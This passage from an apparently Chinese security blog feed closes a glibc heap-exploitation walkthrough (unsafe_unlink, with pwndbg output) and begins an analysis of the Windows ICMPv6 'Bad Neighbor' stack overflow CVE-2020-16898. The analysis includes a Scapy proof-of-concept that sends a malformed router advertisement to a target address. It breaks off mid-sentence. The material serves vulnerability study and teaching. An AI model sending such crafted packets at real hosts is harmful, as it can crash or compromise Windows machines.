class="number">77</span></span><br><span class="line">   <span class="number">78</span>     assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">79</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">80</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fffea4571b0</span> ◂— <span class="number">0x900000009</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7fffea4571b8</span> —▸ <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> ◂— ...</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fffea4571c0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rax r8  <span class="number">0x7fffea4571d0</span> —▸ <span class="number">0x55a4674bc3e0</span> —▸ <span class="number">0x55a4674bc700</span> —▸ <span class="number">0x55a4674bc660</span> —▸ <span class="number">0x55a4674bc5c0</span> ◂— ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7fffea4571d8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7fffea4571e0</span> —▸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) —▸ <span class="number">0x7fd3f030cc60</span> (main_arena+<span class="number">224</span>) —▸ <span class="number">0x7fd3f030cc50</span> (main_arena+<span class="number">208</span>) —▸ <span class="number">0x7fd3f030cc40</span> (main_arena+<span class="number">192</span>) ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffea4571e8</span> ◂— <span class="number">0x0</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>a466c59494 main+<span class="number">619</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>d3f01480b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">15</span> = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) <span class="number">0x7fffea4571d0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="11-unsafe-unlink"><a href="#11-unsafe-unlink" class="headerlink" title="11. unsafe_unlink"></a>11. unsafe_unlink</h3><p>分配两个足够大的 chunk ，free 后不会被放入 fastbin 和tcache （0x420)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">15</span> <span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">16</span></span><br><span class="line">  <span class="number">17</span> <span class="keyword">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">  <span class="number">18</span> <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">► <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span></span><br><span class="line">  <span class="number">22</span> chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">  <span class="number">23</span> <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br></pre></td></tr></table></figure><p>然后我们需要在堆上伪造一个 chunk （ 我们设置我们的假块大小，这样就可以绕过<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f%E4%B8%AD%E4%BB%8B%E7%BB%8D%E7%9A%84%E6%A3%80%E6%9F%A5%E3%80%82">https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f中介绍的检查。</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">29</span> chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">  <span class="number">30</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">► <span class="number">31</span> chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">  <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">  <span class="number">33</span> <span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">  <span class="number">34</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>我们设置好 size ， fd ，bk 以</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x56540553d2a0</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">0x56540553d280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span>         -&gt; chunk0_ptr</span><br><span class="line"><span class="number">0x56540553d2a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span>         -&gt; fake chunk</span><br><span class="line"><span class="number">0x56540553d2b0</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x0000565403b5b010</span></span><br><span class="line"><span class="number">0x56540553d2c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x56540553d2d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>我们假设我们在chunk0中有一个溢出，这样我们就可以自由地改变chunk1的数据</p><p>例如改 chunk1 的preve size  和 size</p><p>bypass check</p><p><code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P)== False</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/unsafe_unlink.c</span><br><span class="line">   <span class="number">42</span> chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">   <span class="number">43</span> <span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">44</span> <span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">   <span class="number">45</span> chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">   <span class="number">46</span></span><br><span class="line"> ► <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">$<span class="number">13</span> = <span class="number">0x430</span></span><br><span class="line">pwndbg&gt; chunkinfo <span class="number">0x56540553d6c0</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : <span class="number">0x420</span></span><br><span class="line">size : <span class="number">0x430</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">fd_nextsize : <span class="number">0x0</span></span><br><span class="line">bk_nextsize : <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>此时就会判断 chunk0 为 free 状态，然后我们free chunk1_ptr 就会发生 unlink, unlink fake chunk的链接，覆盖chunk0_ptr</p><p>最后 我们可以使用chunk0_ptr覆盖自身，另其指向一个任意位置,达到一个任意地址写的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">23</span> = <span class="number">0x565403b5b008</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b008</span>:<span class="number">0x0000565403b5b008</span><span class="number">0x00007f8ca43e66a0</span></span><br><span class="line"><span class="number">0x565403b5b018</span> &lt;completed&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000565403b5b008</span></span><br><span class="line"><span class="number">0x565403b5b028</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">   <span class="number">54</span> chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line">   <span class="number">55</span></span><br><span class="line"> ► <span class="number">56</span> <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p/x chunk0_ptr</span><br><span class="line">$<span class="number">24</span> = <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[<span class="number">3</span>]</span><br><span class="line">$<span class="number">25</span> = <span class="number">0x7f8ca42210b3</span></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;Hello!~&quot;</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">58</span> chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"> ► <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/s <span class="number">0x7ffe4dfce4d0</span></span><br><span class="line"><span class="number">0x7ffe4dfce4d0</span>:<span class="string">&quot;BBBBAAAA&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-16898 &quot;Bad Neighbor&quot; 分析</title>
      <link href="CVE-2020-15898-analysis.html"/>
      <url>CVE-2020-15898-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2020年10月14日，微软修复了一个紧急漏洞：Windows TCP/IP 远程代码执行漏洞，漏洞编号为 CVE-2020-16898。</p><p>从14 号公开的信息可以得知，这是一个与 ipv6 协议有关，漏洞类型为栈溢出的漏洞。</p><h2 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h2><p>通过公开信息</p><blockquote><p>A remote code execution vulnerability exists when the Windows TCP/IP stack improperly handles ICMPv6 Router Advertisement packets that use Option Type 25 (Recursive DNS Server Option) and a length field value that is even. In this Option, the length is counted in increments of 8 bytes, so an RDNSS option with a length of 3 should have a total length of 24 bytes. The option itself consists of five fields: Type, Length, Reserved, Lifetime, and Addresses of IPv6 Recursive DNS Servers. The first four fields always total 8 bytes, but the last field can contain a variable number of IPv6 addresses, which are 16 bytes each. As a result, the length field should always be an odd value of at least 3, per <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">RFC 8106</a>:</p></blockquote><p>以及补丁的 diff 我们大致定位了漏洞的位置</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020023239.png"></a></p><p>漏洞发生的原因应该在 <code>Ipv6pUpdateRDNSS</code> 函数中</p><h2 id="Router-Advertisement-RA-for-short-协议"><a href="#Router-Advertisement-RA-for-short-协议" class="headerlink" title="Router Advertisement (RA for short) 协议"></a><code>Router Advertisement</code> (RA for short) 协议</h2><p>通过 <a href="https://tools.ietf.org/html/rfc8106#section-5.3.1">rfc8106</a> 我们可以知道协议报文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0                   1                   2                   3</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|     Type      |     Length    |           Reserved            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                           Lifetime                            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                                                               |</span><br><span class="line">:            Addresses of IPv6 Recursive DNS Servers            :</span><br><span class="line">|                                                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>我们着重知道以下几个</p><ul><li><strong>Type（1个字节）</strong>：RDNSS选项类型的类型为 25（0x19）</li><li><strong>Length（1个字节）</strong>：如果该选项中包含一个 IPv6 地址，则长度取最小值3 。每增加一个 RDNSS 地址，长度就会增加2。接收器使用“长度”字段来确定选项中IPv6地址的数量</li><li><strong>Addresses of IPv6 Recursive DNS Servers（可变长度，由“Length”字段确定）</strong>：一个或多个递归DNS服务器的 128 位 IPv6 地址 。地址个数为（Length - 1）/ 2</li></ul><p>协议中规定：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">o  The validity of DNS options is checked with the Length field;</span><br><span class="line">   that is, the value of the Length field in the RDNSS option is</span><br><span class="line">   greater than or equal to the minimum value (3) and satisfies the</span><br><span class="line">   requirement that (Length - 1) % 2 &#x3D;&#x3D; 0.  The value of the Length</span><br><span class="line">   field in the DNSSL option is greater than or equal to the minimum</span><br><span class="line">   value (2).  Also, the validity of the RDNSS option is checked with</span><br><span class="line">   the &quot;Addresses of IPv6 Recursive DNS Servers&quot; field; that is, the</span><br><span class="line">   addresses should be unicast addresses.</span><br></pre></td></tr></table></figure></blockquote><p>即 Length 长度字段要满足 <code>(Length - 1) % 2 == 0</code> 则 length 字段必为奇数，且是大于等于3 的奇数</p><p>假设此时 length 长度为 3， 则地址个数为 （3 - 1) / 2  == 1 ，我们知道一个地址长度为 16 字节。IPv6 Recursive DNS Servers 地址前的字段占 8 字节，每个 IPv6 Recursive DNS Servers 地址长度为 16 个字节，所以正常的 RDNSS 选项总长度应满足 16x+8（x&gt;=1），将其除以 8 就是 2x+1（x&gt;=1） ，也就是 Length 字段应该满足的条件。由于 IPv6 RDNSS 地址为 16 个字节，所以 RDNSS 选项总长度会以 16 字节递增，一个最小的长度为 24（8+16）</p><h2 id="如果-Length-是偶数"><a href="#如果-Length-是偶数" class="headerlink" title="如果 Length 是偶数"></a>如果 Length 是偶数</h2><p>通过学习协议，我们知道通常下， length 的值应为大于等 3 的奇数，但是如果当传入的 length 为偶数 2 ，那么会发生什么事情？</p><p>按照协议理解，此时 （2-1）/2 == 0 ，则会判断此 packet 没有地址，则理应会把 RDNSS 选项的最后 8 个字节错误的认为第下一个个选项的前8个字节。</p><p>例如假设我们设置 length 长度为 4 -&gt; rdnss.len = len(rdnss.dns) * 2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc_last_8_bytes</span>(<span class="params">target_addr</span>):</span></span><br><span class="line">    ip = IPv6(dst = target_addr, src = <span class="string">&quot;fe80::250:56ff:fec0:2222&quot;</span>)</span><br><span class="line">    ra = ICMPv6ND_RA()</span><br><span class="line"></span><br><span class="line">    rdnss = ICMPv6NDOptRDNSS(lifetime=<span class="number">900</span>, dns=[<span class="string">&quot;4141:4141:4141:4141:4141:4141:4141:4141&quot;</span>,</span><br><span class="line">            <span class="string">&quot;4242:4242:4242:4242:4242:4242:4242:4242&quot;</span>])</span><br><span class="line">    <span class="comment"># We put an even value for the option length (correct length should be 5)</span></span><br><span class="line">    rdnss.len = len(rdnss.dns) * <span class="number">2</span></span><br><span class="line">    <span class="comment"># We adjust the actual option size (when &#x27;confused&#x27; is appended to it,</span></span><br><span class="line">    <span class="comment"># it must be rdnss.len * 8 bytes == 0x20 bytes long)</span></span><br><span class="line">    truncated = bytes(rdnss)[: (rdnss.len<span class="number">-1</span>) * <span class="number">8</span>]</span><br><span class="line">    <span class="comment"># The last 8 bytes of the crafted RDNSS option are interpreted as</span></span><br><span class="line">    <span class="comment"># the start of a second option</span></span><br><span class="line">    confused = <span class="string">&#x27;XXXXYYYY&#x27;</span></span><br><span class="line">    crafted = truncated + confused</span><br><span class="line"></span><br><span class="line">    send(ip/ra/crafted)</span><br><span class="line"></span><br><span class="line">poc_last_8_bytes(<span class="string">&#x27;fd15:4ba5:5a2b:1008:79f7:979d:4e:97eb&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png"></a></p><p>我们选取上面的一段汇编做一个简单的注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fffff801&#96;26bca5c8 e8a39de5ff     call    tcpip!NetioAdvanceNetBuffer (fffff801&#96;26a24370)</span><br><span class="line">fffff801&#96;26bca5cd 0fb64301       movzx   eax, byte ptr [rbx+1] ; eax &#x3D; option.length</span><br><span class="line">fffff801&#96;26bca5d1 8d4e01         lea     ecx, [rsi+1]</span><br><span class="line">fffff801&#96;26bca5d4 2bc6           sub     eax, esi              ; eax &#x3D; option.length - 1</span><br><span class="line">fffff801&#96;26bca5d6 4183cfff       or      r15d, 0FFFFFFFFh</span><br><span class="line">fffff801&#96;26bca5da 99             cdq     </span><br><span class="line">fffff801&#96;26bca5db f7f9           idiv    eax, ecx              ; eax &#x3D; (option.length - 1) &#x2F; 2</span><br><span class="line">fffff801&#96;26bca5dd 8b5304         mov     edx, dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7         mov     dword ptr [rbp-49h], eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0           mov     esi, eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7         cmp     edx, r15d</span><br></pre></td></tr></table></figure><p>即这断代码在做计算 地址数 <code>(4 - 1) / 2 == 1</code>. 因而会将 NET_BUFFER 前进 24 个字节（3*8）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; u rip</span><br><span class="line">tcpip!Ipv6pUpdateRDNSS+0xa9:</span><br><span class="line">fffff801&#96;26bca5dd 8b5304          mov     edx,dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7          mov     dword ptr [rbp-49h],eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0            mov     esi,eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7          cmp     edx,r15d</span><br><span class="line">fffff801&#96;26bca5e8 7412            je      tcpip!Ipv6pUpdateRDNSS+0xc8 (fffff801&#96;26bca5fc)</span><br><span class="line">fffff801&#96;26bca5ea 0fca            bswap   edx</span><br><span class="line">fffff801&#96;26bca5ec 8d0c12          lea     ecx,[rdx+rdx]</span><br><span class="line">fffff801&#96;26bca5ef 8bc1            mov     eax,ecx</span><br><span class="line">0: kd&gt; rax</span><br><span class="line">ax&#x3D;1</span><br></pre></td></tr></table></figure><p>当我们让程序走到下一个取下一个选项的时候，发现，此时的选项的前8个字节可被伪造</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png"></a></p><h2 id="如何造成栈溢出的？"><a href="#如何造成栈溢出的？" class="headerlink" title="如何造成栈溢出的？"></a>如何造成栈溢出的？</h2><p>我们知道此时可以伪造前 8个字节，那么根据 type 可以走不同的程序流</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png"></a></p><p>根据交叉引用，以及文档此时的函数有 三种 type，分别为</p><p>3： break ，似乎是正常消息</p><p>24：Route Information Option</p><p>25：RDNSS Option （<a href="https://tools.ietf.org/html/rfc4191#section-2.3%EF%BC%89">https://tools.ietf.org/html/rfc4191#section-2.3）</a></p><p>其中 25 是我们触发漏洞的地方， 那么可利用的似乎只有 24 了</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>当 type 为 24 的时候，会调用 <code>NdisGetDataBuffer</code> 该函数，我们发现此函数的 v221 值在栈上， Elen为可控的长度 * 8</p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer</a></p><p>搜索微软文档我们发现该函数原型如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PVOID NdisGetDataBuffer(</span><br><span class="line">  PNET_BUFFER NetBuffer,</span><br><span class="line">  ULONG       BytesNeeded,</span><br><span class="line">  PVOID       Storage,</span><br><span class="line">  UINT        AlignMultiple,</span><br><span class="line">  UINT        AlignOffset</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其第一个参数 NetBuffer 为一个指向 NET_BUFFER 结构的指针；第二个参数 BytesNeeded 为请求数据的长度；第三个参数 Storage 为指向缓冲区的指针，如果调用者不提供缓冲区，则为 NULL。如果此值非 NULL 且请求的数据不连续，则 NDIS 会将请求的数据复制到 Storage 指向的缓冲区。</p><p>NdisGetDataBuffer 函数返回指向连续数据的指针，或者NULL。如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。如果数据不连续，则根据 Storage参数来判断：</p><ul><li>如果 Storage 参数为非 NULL，即指定缓冲区指针，则 NDIS 将数据复制到Storage 指向的缓冲区中，返回值为 Storage参数指针 。</li><li>如果 Storage 参数为 NULL，则返回值为 NULL。</li></ul><p>所以我们要通过此函数触发缓冲区溢出，则需要构造一个非连续的的数据包，这个问题的解决方案是构造一个 “碎片化” 的数据。对 IPv6 数据进行分段则可以。</p><p>如果我们发送带有畸形的RDNSS选项的Router Advertisement数据包时，将其分割成若干个IPv6碎片，那么重新组合的数据包数据就会以非连续的方式存储在NET_BUFFER中。这样一来，对NdisGetDataBuffer的调用就会从我们的数据包中复制任意数量的字节到堆栈中的固定大小的缓冲区中，导致基于堆栈的缓冲区溢出，使得我们可以用任意的值覆盖tcpip！Ipv6pHandleRouterAdvertisement的返回地址。</p><p>另外这里要有程序有一个检查，它允许路由信息选项的最大实际大小（option.Length * 3）为0x18。</p><p>即在一个循环遍历所有headers，做一些基本的验证</p><p>如图，Ipv6pHandleRouterAdvertisement 函数中会检查 Route Information 选项中的 Length 是否大于 3 ，如果大于 3 就会进入错误流程，然后忽略这个包的。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" title="image-20201021003350639" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" alt="image-20201021003350639"></a></p><p>在攻击的过程中</p><p>Route Information 选项的前 8 个字节被嵌到了第一个 Recursive DNS Server 选项的末尾。由于在 Case 0x19 的检查流程中，只判断了 Length 是否小于 3 ，而没有判断该字段是否是偶数值，可导致在对数据包选项进行检查的时候将第一个 Recursive DNS Server 选项长度误当成 0x20，因此检查是通过的。而在真正处理的过程中，又将其长度解析为 0x18</p><p>对于type为0x18会进入下面的流程处理，调用NdisGetDataBuffer函数，其中第二个参数为长度的实际字节大小，等于length<em>8，所以此时传入的actual_length_bytes = 0x22</em> 8 = 